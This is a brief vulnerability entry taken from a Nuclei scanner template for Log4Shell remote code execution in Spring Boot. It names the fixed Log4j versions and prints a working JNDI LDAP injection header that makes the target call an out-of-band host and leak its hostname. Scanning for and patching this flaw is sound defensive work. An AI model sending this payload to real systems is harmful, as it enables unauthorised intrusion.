# Vulnerability: Spring Boot - Remote Code Execution (Apache Log4j)
**Classification:** CWE-502
**Source:** Nuclei Template (`springboot-log4j-rce.yaml`)

## Description
Spring Boot is susceptible to remote code execution via Apache Log4j.

## Secure Mitigation
Upgrade to Log4j 2.3.1 (for Java 6), 2.12.3 (for Java 7), or 2.17.0 (for Java 8 and later).

## Vulnerable Code Pattern / Exploit Payload
```http
GET / HTTP/1.1
Host: {{Hostname}}
X-Api-Version: ${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.xapiversion.{{interactsh-url}}}
```

